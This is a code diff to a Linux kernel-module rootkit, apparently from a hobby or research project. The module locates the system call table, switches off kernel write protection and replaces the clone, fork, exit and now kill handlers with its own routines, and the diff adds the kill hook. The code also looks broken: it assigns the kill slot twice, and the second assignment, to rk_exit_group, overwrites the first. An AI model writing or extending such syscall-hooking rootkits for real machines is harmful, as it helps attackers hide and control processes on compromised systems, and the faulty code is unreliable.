@@ -2,10 +2,11 @@
 
 static unsigned long *syscall_table;
 
-asmlinkage long (*orig_access)(const struct pt_regs *);
+sys_call_stub orig_access;
 asmlinkage long (*orig_clone)(unsigned long, unsigned long, int __user *, unsigned long, int __user *);
 asmlinkage long (*orig_fork)(void);
 asmlinkage long (*orig_exit)(int);
+sys_call_stub orig_kill;
 
 static int __init lkm_rootkit_init(void)
 {
@@ -23,10 +24,11 @@ static int __init lkm_rootkit_init(void)
     syscall_table = find_syscall_table();
     pr_info("Found syscall_table at %lx\n", *syscall_table);
 
-    orig_access = (asmlinkage long (*)(const struct pt_regs *))syscall_table[__NR_access];
+    orig_access = (sys_call_stub)syscall_table[__NR_access];
     orig_clone = (asmlinkage long (*)(unsigned long, unsigned long, int __user *, unsigned long, int __user *_))syscall_table[__NR_clone];
     orig_fork = (asmlinkage long (*)(void))syscall_table[__NR_fork];
     orig_exit = (asmlinkage long (*)(int))syscall_table[__NR_exit];
+    orig_kill = (sys_call_stub)syscall_table[__NR_kill];
 
     disable_write_protect();
 
@@ -34,6 +36,8 @@ static int __init lkm_rootkit_init(void)
     syscall_table[__NR_clone] = (unsigned long)rk_clone;
     syscall_table[__NR_fork] = (unsigned long)rk_fork;
     syscall_table[__NR_exit] = (unsigned long)rk_exit;
+    syscall_table[__NR_kill] = (unsigned long)rk_kill;
+    syscall_table[__NR_kill] = (unsigned long)rk_exit_group;
 
     enable_write_protect();
 
@@ -51,6 +55,7 @@ static void __exit lmk_rootkit_exit(void)
     syscall_table[__NR_clone] = (unsigned long)orig_clone;
     syscall_table[__NR_fork] = (unsigned long)orig_fork;
     syscall_table[__NR_exit] = (unsigned long)orig_exit;
+    syscall_table[__NR_kill] = (unsigned long)orig_kill;
 
     enable_write_protect();
 
